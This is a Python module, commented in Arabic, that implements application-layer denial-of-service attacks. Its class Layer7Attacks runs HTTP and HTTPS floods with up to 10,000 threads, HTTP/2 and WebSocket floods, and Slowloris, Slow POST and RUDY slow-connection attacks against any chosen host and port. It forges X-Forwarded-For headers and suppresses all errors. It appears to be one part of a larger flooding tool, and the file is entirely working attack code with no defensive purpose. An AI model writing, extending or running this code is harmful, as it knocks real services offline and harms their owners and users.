#!/usr/bin/env python3
"""
هجمات Layer 7 - طبقة التطبيق
"""

import requests
import socket
import threading
import random
import time
import ssl
import http.client
import urllib3
from concurrent.futures import ThreadPoolExecutor

urllib3.disable_warnings()

class Layer7Attacks:
    def __init__(self, killer):
        self.killer = killer
        self.ips = killer.ips
        
    def http_flood(self, target, port):
        """HTTP Flood - إغراق بطلبات HTTP"""
        while self.killer.running:
            try:
                url = f"http://{target}:{port}"
                headers = {
                    'User-Agent': random.choice(self.ips),
                    'X-Forwarded-For': random.choice(self.ips),
                    'Accept': '*/*',
                    'Connection': 'keep-alive'
                }
                
                with ThreadPoolExecutor(max_workers=10000) as executor:
                    for _ in range(10000):
                        executor.submit(requests.get, url, headers=headers, timeout=0.1, verify=False)
                        
                with self.killer.lock:
                    self.killer.stats['packets'] += 10000
            except:
                pass
    
    def https_flood(self, target, port):
        """HTTPS Flood - إغراق بطلبات مشفرة"""
        while self.killer.running:
            try:
                url = f"https://{target}:{port}"
                headers = {
                    'User-Agent': random.choice(self.ips),
                    'X-Forwarded-For': random.choice(self.ips)
                }
                
                with ThreadPoolExecutor(max_workers=10000) as executor:
                    for _ in range(10000):
                        executor.submit(requests.get, url, headers=headers, timeout=0.1, verify=False)
                        
                with self.killer.lock:
                    self.killer.stats['packets'] += 10000
            except:
                pass
    
    def http2_flood(self, target, port):
        """HTTP/2 Flood - إغراق بطلبات HTTP/2"""
        import h2.connection
        import h2.config
        
        while self.killer.running:
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.connect((target, port))
                
                config = h2.config.H2Configuration(client_side=True)
                conn = h2.connection.H2Connection(config=config)
                conn.initiate_connection()
                sock.send(conn.data_to_send())
                
                for _ in range(10000):
                    stream_id = conn.get_next_available_stream_id()
                    headers = [
                        (':method', 'GET'),
                        (':path', '/'),
                        (':authority', target),
                        (':scheme', 'https'),
                    ]
                    conn.send_headers(stream_id, headers)
                    sock.send(conn.data_to_send())
                    
                    with self.killer.lock:
                        self.killer.stats['packets'] += 1
            except:
                pass
    
    def websocket_flood(self, target, port):
        """WebSocket Flood - إغراق اتصالات WebSocket"""
        import websocket
        
        while self.killer.running:
            try:
                ws = websocket.WebSocket()
                ws.connect(f"ws://{target}:{port}")
                
                for _ in range(1000):
                    ws.send(random.choice(self.ips))
                    with self.killer.lock:
                        self.killer.stats['packets'] += 1
            except:
                pass
    
    def slowloris(self, target, port):
        """Slowloris Attack - إبطاء الاتصالات"""
        sockets = []
        
        for _ in range(10000):
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.connect((target, port))
                s.send(f"GET / HTTP/1.1\r\nHost: {target}\r\n".encode())
                sockets.append(s)
                with self.killer.lock:
                    self.killer.stats['connections'] += 1
            except:
                pass
        
        while self.killer.running:
            for s in sockets:
                try:
                    s.send(f"X-{random.randint(0,1000)}: {random.randint(0,1000)}\r\n".encode())
                    with self.killer.lock:
                        self.killer.stats['packets'] += 1
                except:
                    try:
                        s.close()
                        sockets.remove(s)
                    except:
                        pass
    
    def slow_post(self, target, port):
        """Slow POST Attack - إرسال POST ببطء"""
        while self.killer.running:
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.connect((target, port))
                
                post_data = f"POST / HTTP/1.1\r\nHost: {target}\r\n"
                post_data += f"Content-Length: 1000000\r\n"
                post_data += f"Content-Type: application/x-www-form-urlencoded\r\n"
                post_data += f"Connection: keep-alive\r\n\r\n"
                
                s.send(post_data.encode())
                
                for _ in range(1000):
                    s.send(b"a")
                    time.sleep(0.1)
                    with self.killer.lock:
                        self.killer.stats['packets'] += 1
            except:
                pass
    
    def rudy_attack(self, target, port):
        """RUDY Attack - إبطاء POST"""
        while self.killer.running:
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.connect((target, port))
                
                headers = f"POST / HTTP/1.1\r\nHost: {target}\r\n"
                headers += f"Content-Length: 1000000\r\n"
                headers += f"Connection: keep-alive\r\n\r\n"
                
                s.send(headers.encode())
                
                for _ in range(1000):
                    s.send(b"a")
                    time.sleep(1)
                    with self.killer.lock:
                        self.killer.stats['packets'] += 1
            except:
                pass
